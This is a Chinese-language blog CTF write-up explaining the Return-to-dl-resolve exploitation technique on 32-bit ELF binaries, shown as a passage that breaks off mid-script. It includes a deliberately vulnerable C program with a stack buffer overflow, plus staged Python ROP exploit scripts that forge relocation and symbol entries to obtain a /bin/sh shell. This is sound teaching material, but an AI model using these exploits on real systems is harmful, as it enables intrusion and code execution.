<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta property="og:type" content="website">
<meta property="og:title" content="Swing&#39;Blog 浮生若梦">
<meta property="og:url" content="https://bestwing.me/images/Return-to-dl-resolve/%E9%80%9A%E8%BF%87ELF%E5%8A%A8%E6%80%81%E8%A3%85%E8%BD%BD%E6%9E%84%E9%80%A0ROP%E9%93%BE%20%EF%BC%88%20Return-to-dl-resolve%EF%BC%89.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:locale">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459431478784.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459407202726.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459407452175.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459408892173.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459409118762.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459414521835.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459415839271.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459415839271.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459417176752.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459417932071.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459425491545.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459398186541.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459398079809.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459438836360.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459439191206.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459442727696.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459442523856.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459442264800.png">
<meta property="og:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459442011940.png">
<meta property="article:published_time" content="2022-04-23T14:32:39.717Z">
<meta property="article:modified_time" content="2016-04-07T05:35:06.000Z">
<meta property="article:author" content="Swing">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://bestwing.me/images/Return-to-dl-resolve/1459431478784.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Swing&#39;Blog 浮生若梦</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
    <div class="content index py4">
        
          <header id="header">
  <a href="/">
  
    
      <div id="logo" style="background-image: url(/images/logo.png);"></div>
    
  
    <div id="title">
      <h1>Swing&#39;Blog 浮生若梦</h1>
    </div>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Articles</a></li>
       
        <li><a href="/search">Search</a></li>
       
        <li><a href="/atom.xml">RSS</a></li>
       
        <li><a href="/categories/">Categories</a></li>
       
        <li><a href="/link">Links</a></li>
      
    </ul>
  </div>
</header>

        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  

  <div class="content" itemprop="articleBody">
      
          <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h3 id="通过ELF动态装载构造ROP链-（-Return-to-dl-resolve）"><a href="#通过ELF动态装载构造ROP链-（-Return-to-dl-resolve）" class="headerlink" title="通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）"></a>通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）</h3><p>####0x00 前言<br>玩CTF的赛棍都知道，PWN类型的漏洞题目一般会提供一个可执行程序，同时会提供程序运行动态链接的libc库。通过libc.so可以得到库函数的偏移地址，再结合泄露GOT表中libc函数的地址，计算出进程中实际函数的地址，以绕过ASLR。这种手法叫return-to-libc。本文将介绍一种不依赖libc的手法。</p>
<p>以XDCTF2015-EXPLOIT2为例，这题当时是只给了可执行文件的。出这题的初衷就是想通过Return-to-dl-resolve的手法绕过NX和ASLR的限制。本文将详细介绍一下该手法的利用过程。</p>
<p>这里构造一个存在栈缓冲区溢出漏洞的程序，以方便后续我们构造ROP链。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void vuln()</span><br><span class="line">&#123;</span><br><span class="line">	char buf[100];</span><br><span class="line">	setbuf(stdin,buf);</span><br><span class="line">	read(0,buf,256); &#x2F;&#x2F; Buffer OverFlow</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char buf[100] &#x3D; &quot;Welcome to XDCTF2015~!\n&quot;;</span><br><span class="line"></span><br><span class="line">	setbuf(stdout,buf);</span><br><span class="line">	write(1,buf,strlen(buf));</span><br><span class="line"></span><br><span class="line">	vuln();</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="0x01-准备知识"><a href="#0x01-准备知识" class="headerlink" title="0x01 准备知识"></a>0x01 准备知识</h4><h5 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h5><p>ELF可执行文件由ELF头部，程序头部表和其对应的段，节区头部表和其对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为 <code>PT_DYNAMIC</code> 的段，它包含<code>.dynamic</code> 节区。结构如图，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line"> &#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
<p>其中Tag对应着每个节区。比如<code>JMPREL</code>对应着<code>.rel.plt</code><br><a href="/images/Return-to-dl-resolve/1459431478784.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459431478784.png" alt="Alt text"></a></p>
<p>节区中包含目标文件的所有信息。节的结构如图。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">    Elf32_Word sh_name;        &#x2F;&#x2F; 节区头部字符串表节区的索引</span><br><span class="line">    Elf32_Word sh_type;        &#x2F;&#x2F; 节区类型</span><br><span class="line">    Elf32_Word sh_flags;       &#x2F;&#x2F; 节区标志，用于描述属性</span><br><span class="line">    Elf32_Addr sh_addr;        &#x2F;&#x2F; 节区的内存映像</span><br><span class="line">    Elf32_Off  sh_offset;      &#x2F;&#x2F; 节区的文件偏移</span><br><span class="line">    Elf32_Word sh_size;        &#x2F;&#x2F; 节区的长度</span><br><span class="line">    Elf32_Word sh_link;        &#x2F;&#x2F; 节区头部表索引链接</span><br><span class="line">    Elf32_Word sh_info;        &#x2F;&#x2F; 附加信息</span><br><span class="line">    Elf32_Word sh_addralign;   &#x2F;&#x2F; 节区对齐约束</span><br><span class="line">    Elf32_Word sh_entsize;     &#x2F;&#x2F; 固定大小的节区表项的长度</span><br><span class="line">&#125;Elf32_Shdr;</span><br></pre></td></tr></table></figure>
<p>如图，列出了该文件的28个节区。其中类型为REL的节区包含重定位表项。<br><a href="/images/Return-to-dl-resolve/1459407202726.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459407202726.png" alt="Alt text"></a></p>
<p>（1） 其中<code>.rel.plt</code>节是用于函数重定位，<code>.rel.dyn</code>节是用于变量重定位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Addr r_offset;    &#x2F;&#x2F; 对于可执行文件，此值为虚拟地址</span><br><span class="line">    Elf32_Word r_info;      &#x2F;&#x2F; 符号表索引</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">#define ELF32_R_SYM(i) ((i)&gt;&gt;8)</span><br><span class="line">#define ELF32_R_TYPE(i) ((unsigned char)(i))</span><br><span class="line">#define ELF32_R_INFO(s, t) (((s)&lt;&lt;8) + (unsigned char)(t))</span><br></pre></td></tr></table></figure>
<p>如图，在<code>.rel.plt</code>中列出了链接的C库函数，以下均已<code>write</code>函数为例，<code>write</code>函数的<code>r_offset=0x804a010</code>,<code>r_info=0x507</code><br><a href="/images/Return-to-dl-resolve/1459407452175.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459407452175.png" alt="Alt text"></a></p>
<p>（2） 其中<code>.got</code>节保存全局变量偏移表，<code>.got.plt</code>节存储着全局函数偏离表。<code>.got.plt</code>对应着<code>Elf32_Rel</code>结构中<code>r_offset</code>的值。如图，<code>write</code>函数在GOT表中位于<code>0x804a010</code><br><a href="/images/Return-to-dl-resolve/1459408892173.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459408892173.png" alt="Alt text"></a></p>
<p>（3）其中<code>.dynsym</code>节区包含了动态链接符号表。其中，<code>Elf32_Sym[num]</code>中的<code>num</code>对应着<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code>。根据定义，<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info)&gt;&gt;8</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;   &#x2F;* Symbol name (string tbl index) *&#x2F;</span><br><span class="line">  Elf32_Addr    st_value;  &#x2F;* Symbol value *&#x2F;</span><br><span class="line">  Elf32_Word    st_size;   &#x2F;* Symbol size *&#x2F;</span><br><span class="line">  unsigned char st_info;   &#x2F;* Symbol type and binding *&#x2F;</span><br><span class="line">  unsigned char st_other;  &#x2F;* Symbol visibility under glibc&gt;&#x3D;2.2 *&#x2F;</span><br><span class="line">  Elf32_Section st_shndx;  &#x2F;* Section index *&#x2F;</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
<p>如图，<code>write</code>的索引值为<code>ELF32_R_SYM(0x507) = 0x507 &gt;&gt; 8 = 5</code>。而<code>Elf32_Sym[5]</code>即保存着<code>write</code>的符号表信息。并且<code>ELF32_R_TYPE(0x507) = 7</code>,对应<code>R_386_JUMP_SLOT</code><br><a href="/images/Return-to-dl-resolve/1459409118762.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459409118762.png" alt="Alt text"></a></p>
<p>（4）其中<code>.dynstr</code>节包含了动态链接的字符串。这个节区以<code>\x00</code>作为开始和结尾，中间每个字符串也以<code>\x00</code>间隔。如图，<code>Elf32_Sym[5]-&gt;st_name = 0x54</code>,所以<code>.dynstr</code>加上<code>0x54</code>的偏移量，就是字符串<code>write</code><br><a href="/images/Return-to-dl-resolve/1459414521835.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459414521835.png" alt="Alt text"></a></p>
<p>（5）其中<code>.plt</code>节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。如图，当程序执行<code>call write@plt</code>时，实际会跳到<code>0x80483c0</code>去执行。<br><a href="/images/Return-to-dl-resolve/1459415839271.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459415839271.png" alt="Alt text"></a></p>
<h5 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h5><p>程序在执行的过程中，可能引入的有些C库函数到结束时都不会执行。所以ELF采用延迟绑定的技术，在第一次调用C库函数是时才会去寻找真正的位置进行绑定。</p>
<p>具体来说，在前一部分我们已经知道，当程序执行<code>call write@plt</code>时，实际会跳到<code>0x80483c0</code>去执行。而<code>0x80483c0</code>处的汇编代码仅仅三行。我们来看一下这三行代码做了什么。<br><a href="/images/Return-to-dl-resolve/1459415839271.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459415839271.png" alt="Alt text"></a><br>第一行，上一部分也提到了<code>0x804a010</code>是<code>write</code>的GOT表位置，当我们第一次调用<code>write</code>时，其对应的GOT表里并没有存放<code>write</code>的真实地址，而是下一条指令的地址。第二、三行，把<code>reloc_arg=0x20</code>作为参数推入栈中，跳到<code>0x8048370</code>继续执行。<br><a href="/images/Return-to-dl-resolve/1459417176752.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459417176752.png" alt="Alt text"></a></p>
<p><code>0x8048370</code>再把<code>link_map = *(GOT+4)</code>作为参数推入栈中，而<code>*(GOT+8)</code>中保存的是<code>_dl_runtime_resolve</code>函数的地址。因此以上指令相当于执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>，该函数会完成符号的解析，即将真实的<code>write</code>函数地址写入其<code>GOT</code>条目中，随后把控制权交给<code>write</code>函数。<br><a href="/images/Return-to-dl-resolve/1459417932071.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459417932071.png" alt="Alt text"></a></p>
<p>其中<code>_dl_runtime_resolve</code>是在<code>glibc-2.22/sysdeps/i386/dl-trampoline.S</code>中用汇编实现的。<code>0xf7ff04fb</code>处即调用<code>_dl_fixup</code>，并且通过寄存器传参。<br><a href="/images/Return-to-dl-resolve/1459425491545.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459425491545.png" alt="Alt text"></a></p>
<p>其中<code>_dl_fixup</code>是在<code>glibc-2.22/elf/dl-runtime.c</code>实现的，我们只关注一些主要函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
<p>首先通过参数<code>reloc_arg</code>计算重定位入口，这里的<code>JMPREL</code>即<code>.rel.plt</code>，<code>reloc_offset</code>即<code>reloc_arg</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const PLTREL *const reloc &#x3D; (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure>
<p>然后通过<code>reloc-&gt;r_info</code>找到<code>.dynsym</code>中对应的条目。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const ElfW(Sym) *sym &#x3D; &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br></pre></td></tr></table></figure>
<p>这里还会检查<code>reloc-&gt;r_info</code>的最低位是不是<code>R_386_JUMP_SLOT=7</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) &#x3D;&#x3D; ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure>
<p>接着通过<code>strtab + sym-&gt;st_name</code>找到符号表字符串，<code>result</code>为libc基地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result &#x3D; _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, NULL);</span><br></pre></td></tr></table></figure>
<p><code>value</code>为libc基址加上要解析函数的偏移地址，也即实际地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value &#x3D; DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);</span><br></pre></td></tr></table></figure>
<p>最后把<code>value</code>写入相应的GOT表条目中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h4><ol>
<li>控制EIP为PLT[0]的地址，只需传递一个<code>index_arg</code>参数</li>
<li>控制<code>index_arg</code>的大小，使<code>reloc</code>的位置落在可控地址内</li>
<li>伪造<code>reloc</code>的内容，使<code>sym</code>落在可控地址内</li>
<li>伪造<code>sym</code>的内容，使<code>name</code>落在可控地址内</li>
<li>伪造<code>name</code>为任意库函数，如<code>system</code></li>
</ol>
<h5 id="控制EIP"><a href="#控制EIP" class="headerlink" title="控制EIP"></a>控制EIP</h5><p>首先确认一下进程当前开了哪些保护<br><a href="/images/Return-to-dl-resolve/1459398186541.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459398186541.png" alt="Alt text"></a></p>
<p>由于程序存在栈缓冲区漏洞，我们可以用PEDA很快定位覆写EIP的位置。</p>
<p><a href="/images/Return-to-dl-resolve/1459398079809.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459398079809.png" alt="Alt text"></a></p>
<h5 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h5><p>我们先写一个ROP链，直接返回到<code>write@plt</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line"></span><br><span class="line">offset &#x3D; 112</span><br><span class="line"></span><br><span class="line">addr_plt_read  &#x3D; 0x08048390   # objdump -d -j.plt bof | grep &quot;read&quot;</span><br><span class="line">addr_plt_write &#x3D; 0x080483c0   # objdump -d -j.plt bof | grep &quot;write&quot;</span><br><span class="line"></span><br><span class="line">#.&#x2F;rp-lin-x86  --file&#x3D;bof --rop&#x3D;3 --unique &gt; gadgets.txt</span><br><span class="line">pppop_ret &#x3D; 0x0804856c</span><br><span class="line">pop_ebp_ret   &#x3D;  0x08048453</span><br><span class="line">leave_ret &#x3D; 0x08048481</span><br><span class="line"></span><br><span class="line">stack_size &#x3D; 0x800</span><br><span class="line">addr_bss   &#x3D; 0x0804a020   # readelf -S bof | grep &quot;.bss&quot;</span><br><span class="line">base_stage &#x3D; addr_bss + stack_size</span><br><span class="line"></span><br><span class="line">target &#x3D; &quot;.&#x2F;bof&quot;</span><br><span class="line">io   &#x3D; zio((target))</span><br><span class="line"></span><br><span class="line">io.read_until(&#39;Welcome to XDCTF2015~!\n&#39;)</span><br><span class="line"># io.gdb_hint([0x80484bd])</span><br><span class="line"></span><br><span class="line">buf1  &#x3D; &#39;A&#39; * offset</span><br><span class="line">buf1 +&#x3D; l32(addr_plt_read)</span><br><span class="line">buf1 +&#x3D; l32(pppop_ret)</span><br><span class="line">buf1 +&#x3D; l32(0)</span><br><span class="line">buf1 +&#x3D; l32(base_stage)</span><br><span class="line">buf1 +&#x3D; l32(100)</span><br><span class="line">buf1 +&#x3D; l32(pop_ebp_ret)</span><br><span class="line">buf1 +&#x3D; l32(base_stage)</span><br><span class="line">buf1 +&#x3D; l32(leave_ret)</span><br><span class="line">io.writeline(buf1)</span><br><span class="line"></span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_write)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>最后会把我们输入的<code>cmd</code>打印出来<br><a href="/images/Return-to-dl-resolve/1459438836360.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459438836360.png" alt="Alt text"></a></p>
<h5 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h5><p>这次我们控制EIP返回到<code>PLT0</code>，要带上<code>index_offset</code>。这里我们修改一下<code>buf2</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">index_offset   &#x3D; 0x20</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><a href="/images/Return-to-dl-resolve/1459439191206.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459439191206.png" alt="Alt text"></a></p>
<h5 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h5><p>这一次我们控制<code>index_offset</code>，使其指向我们伪造的<code>fake_reloc</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">r_info         &#x3D; 0x507</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line"></span><br><span class="line">buf2 &#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(addr_plt_start)</span><br><span class="line">buf2 +&#x3D; l32(index_offset)</span><br><span class="line">buf2 +&#x3D; &#39;AAAA&#39;</span><br><span class="line">buf2 +&#x3D; l32(1)</span><br><span class="line">buf2 +&#x3D; l32(base_stage+80)</span><br><span class="line">buf2 +&#x3D; l32(len(cmd))</span><br><span class="line">buf2 +&#x3D; fake_reloc</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (80-len(buf2))</span><br><span class="line">buf2 +&#x3D; cmd + &#39;\x00&#39;</span><br><span class="line">buf2 +&#x3D; &#39;A&#39; * (100-len(buf2))</span><br><span class="line">io.writeline(buf2)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>同样会把我们输入的<code>cmd</code>打印出来<br><a href="/images/Return-to-dl-resolve/1459442727696.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459442727696.png" alt="Alt text"></a></p>
<h5 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h5><p>这一次我们伪造<code>fake_sym</code>，使其指向我们控制的<code>st_name</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">addr_plt_start &#x3D; 0x8048370 # objdump -d -j.plt bof</span><br><span class="line">addr_rel_plt   &#x3D; 0x8048318 # objdump -s -j.rel.plt a.out</span><br><span class="line">index_offset   &#x3D; (base_stage + 28) - addr_rel_plt</span><br><span class="line">addr_got_write &#x3D; 0x804a020</span><br><span class="line">addr_dynsym    &#x3D; 0x080481d8</span><br><span class="line">addr_dynstr    &#x3D; 0x08048268</span><br><span class="line">fake_sym       &#x3D; base_stage + 36</span><br><span class="line">align          &#x3D; 0x10 - ((fake_sym - addr_dynsym) &amp; 0xf)</span><br><span class="line">fake_sym       &#x3D; fake_sym + align</span><br><span class="line">index_dynsym   &#x3D; (fake_sym - addr_dynsym) &#x2F; 0x10</span><br><span class="line">r_info         &#x3D; (index_dynsym &lt;&lt; 8 ) | 0x7</span><br><span class="line">fake_reloc     &#x3D; l32(addr_got_write) + l32(r_info)</span><br><span class="line">st_name        &#x3D; 0x54</span><br><span class="line">fake_sym       &#x3D; l32(st_name) + l32(0) 